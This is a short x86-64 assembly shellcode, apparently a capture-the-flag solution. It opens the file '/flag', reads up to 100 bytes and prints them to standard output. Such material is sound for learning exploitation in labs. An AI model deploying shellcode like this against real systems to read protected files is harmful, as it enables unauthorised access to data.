.intel_syntax noprefix
_start:
    mov rax,2
    xor rsi,rsi
    xor rsi,rsi
    lea rdi,[rip + flagtext]
    syscall

    mov rdi,rax
    xor rax,rax
    mov rsi,rsp
    mov rdx,100
    syscall

    mov rax,1
    mov rdi,1
    syscall 

    mov rax,60
    syscall


flagtext:
    .ascii "/flag"
